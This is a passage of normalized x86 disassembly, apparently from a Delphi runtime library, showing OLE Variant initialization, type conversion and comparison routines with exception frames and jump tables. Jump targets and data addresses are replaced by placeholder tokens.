movsx eax [ ebx + 0x8 ]
call sub_408288
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404904
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408288
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404904
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_408288
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404904
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_408374
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404904
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_408374
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404904
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412c8c
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_412aa8
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4047f4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4131e5
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4047d0
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_4040d0
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_4047d0
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_4040d0
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4047d0
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_4040d0
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4047d0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4040d0
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412b60
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4047f4
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404904
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40ea14
test ah 0x40
je r-xdata
mov eax esi
call sub_4047b8
mov edx eax
mov eax ebx
call sub_412bc4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412aa8
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4047f4
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_412aa8
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4047f4
jmp r-xdata
jmp [ eax * 4 + jump_table_412f4d ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408288
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404904
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408288
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404904
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409710
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404904
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409710
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404904
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_41227c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4047f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_4122b4
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4047f4
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4048c8
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_4122ec
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4047f4
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408288
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404904
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408288
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404904
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408288
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404904
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_408374
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404904
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_408374
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404904
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412c8c
jmp r-xdata
sub_4131ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413256
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f574
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_40595c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41325d
lea eax [ ebp - 0x10 ]
call sub_40f24c
retn
mov dx 0xd
mov ax 0x101
call sub_40ea14
sub_413264
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_4131ec
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40595c
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40595c
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_405944
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_414760
test al al
je r-xdata
mov eax esi
call sub_405944
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40ea14
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40ea14
mov eax esi
call sub_405944
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403364
test al al
jne r-xdata
sub_413330
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_405944
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_405944
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40ea14
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40595c
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40595c
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_414760
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40ea14
mov eax esi
call sub_405944
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403364
test al al
jne r-xdata
sub_4133dc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40f1d0
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_413418
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1d0
sub_413438
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f1d0
sub_413458
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1d0
sub_413478
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1d0
sub_413498
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f1d0
sub_4134b8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1d0
sub_4134d8
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f1d0
sub_413504
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40f1d0
sub_413528
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f1d0
sub_413554
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f1d0
sub_413580
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f1d0
sub_4135ac
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40f1d0
sub_413610
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_404100
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1d0
sub_41363c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_4049b4
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1d0
sub_413674
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40595c
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1d0
sub_4136a0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40595c
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1d0
sub_4136cc
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
jne r-xdata
call sub_40eab0
mov bx 0x8
jmp r-xdata
sub_4136f0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4137b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_40f574
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413fa4
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4137ba
lea eax [ ebp - 0x11 ]
call sub_40f24c
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413787
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_40f574
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413fa4
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_40f24c
retn
sub_4137d8
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_40eb04
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40eb04
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40eb04
jmp r-xdata
je r-xdata
call sub_40eab0
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_4138d4
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_413910
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413938
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413960
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_41398c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_4139e7
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_412564
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412564
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407f7c
xor edx edx
call sub_4138c0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4139ee
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
sub_4139f8
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov ax [ esi ]
call sub_4136cc
movzx eax ax
mov bl [ eax + rw-data ]
mov ax [ edi ]
call sub_4136cc
movzx eax ax
mov al [ eax + rw-data ]
xor edx edx
mov dl al
xor ecx ecx
mov cl bl
imul ecx ecx 0xb
add ecx rw-data
movzx edx [ ecx + edx ]
cmp edx 0xa
ja r-xdata
call sub_40eab0
mov al 0x1
jmp [ edx * 4 + jump_table_413a49 ]
call sub_40eab0
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_4137c4
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_4137d8
jmp r-xdata
mov eax edi
call sub_40fc04
push eax
mov eax esi
call sub_40fc04
pop edx
call sub_4138c0
jmp r-xdata
mov eax esi
call sub_4106c8
push edx
push eax
mov eax edi
call sub_4106c8
push edx
push eax
call sub_4138d4
jmp r-xdata
mov eax esi
call sub_4111d8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_4111d8
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_413910
jmp r-xdata
mov eax esi
call sub_411948
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_411948
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_413938
jmp r-xdata
mov eax esi
call sub_411eb0
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_411eb0
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_413960
jmp r-xdata
mov edx edi
mov eax esi
call sub_41398c
jmp r-xdata
mov eax edi
call sub_410cc4
and eax 0x7f
push eax
mov eax esi
call sub_410cc4
and eax 0x7f
pop edx
call sub_4138c0
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_4136f0
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_413b84
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x1
mov si [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_4137c4
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_4137c4
mov [ ebp - 0x9 ] al
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_414760
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x2
xor eax eax
call sub_4137d8
mov [ ebp - 0x9 ] al
jmp r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
call sub_414760
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov al 0x2
call sub_4137d8
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_40eab0
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40eab0
jmp r-xdata
mov esi [ ebp - 0x4 ]
mov si [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413d1d
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f840
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax esi
call sub_414760
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413eaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f840
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0x28 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413e0d
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f840
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_4139f8
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f24c
retn
call sub_40e9c0
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413c8f
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f840
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0xc ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40eab0
jmp r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
call sub_4139f8
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f24c
retn
call sub_40e9c0
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f24c
retn
call sub_40e9c0
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f24c
retn
call sub_40e9c0
call sub_40eab0
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413f65
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f840
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f24c
retn
call sub_40e9c0
sub_413fa4
push esi
push edi
mov si [ eax ]
mov di [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_413fa4
jmp r-xdata
call sub_4139f8
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_413fa4
jmp r-xdata
pop edi
pop esi
retn
call sub_413b84
and di 0xfff
cmp di 0x10f
jae r-xdata
call sub_4139f8
jmp r-xdata
sub_414190
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4142b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_404100
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_404100
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_414760
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_404100
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4043b8
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_40839c
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_4043b8
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403200
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402884
